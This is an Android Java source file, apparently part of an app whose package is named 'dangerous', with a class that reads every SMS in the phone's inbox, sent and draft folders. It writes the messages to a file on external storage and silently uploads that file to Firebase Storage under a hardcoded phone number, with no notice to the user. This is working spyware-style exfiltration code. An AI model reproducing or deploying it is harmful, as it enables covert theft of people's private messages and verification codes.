package com.rrdreamtech.dangerous.Message;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.rrdreamtech.dangerous.MainActivity;
import com.snatik.storage.Storage;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;

public class ReadMessage  extends AppCompatActivity {
    Context context;
    String  path;
    Storage storage;
    String newDir;
    FileWriter writer;
    String all;
    File fpath;
    private StorageReference storageRef;
    String number="8519079634";
    String msgData = "";

    public ReadMessage(MainActivity mainActivity) {
        this.context=mainActivity;
        ReadMessage();
    }




    public void ReadMessage(){
        // public static final String INBOX = "content://sms/inbox";
// public static final String SENT = "content://sms/sent";
// public static final String DRAFT = "content://sms/draft";

       storage= writeFileOnInternalStorage();
       create(new File(newDir));
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData +="\n\n\n\n\n";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx) +"\n";
                    Log.e("msg",msgData);
                }
                // use msgData
            } while (cursor.moveToNext());
        }

         cursor = context.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData +="\n\n\n\n\n";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx) +"\n";
                    Log.e("msg",msgData);
                }
                // use msgData
            } while (cursor.moveToNext());
        }

        cursor = context.getContentResolver().query(Uri.parse("content://sms/draft"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData +="\n\n\n\n\n";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx) +"\n";
                    Log.e("msg",msgData);
                }
                // use msgData
            } while (cursor.moveToNext());
        }


        Writefile(msgData);
        upload();
    }





    public Storage writeFileOnInternalStorage(){
        Storage storage = new Storage(context);
        path = storage.getExternalStorageDirectory();
        newDir = path + File.separator + "My Sample Directory";
        storage.createDirectory(newDir);

        return storage;
    }

    public void Writefile(String sBody) {
        try{
            writer.append(sBody);
            writer.flush();
            writer.close();

        }catch (Exception e){
            e.printStackTrace();

        }
    }

    public Writer create(File file) {
        fpath  = new File(file, "SMS.docs");
        try {
            writer = new FileWriter(fpath);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return  writer;
    }


    public void upload() {

        storageRef = FirebaseStorage.getInstance().getReference();
        Uri file = Uri.fromFile(new File(String.valueOf(fpath)));
        StorageReference riversRef = storageRef.child("message").child(number+"/SMS.docs");
        riversRef.putFile(file)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        // Get a URL to the uploaded content
//                        Uri downloadUrl = taskSnapshot.getDownloadUrl();
                        Log.e("failure ","success");
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        // Handle unsuccessful uploads
                        // ...
                        Log.e("failure ","failure");
                    }
                });
    }

}
